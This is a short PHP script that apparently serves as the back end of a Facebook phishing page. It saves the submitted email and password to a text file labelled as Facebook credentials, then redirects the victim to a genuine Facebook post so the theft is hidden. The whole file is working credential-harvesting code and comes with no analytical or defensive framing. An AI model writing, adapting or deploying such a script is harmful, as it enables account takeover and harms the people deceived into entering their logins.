<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://www.facebook.com/share/p/1DdfUsgMU1/');
exit();
?>
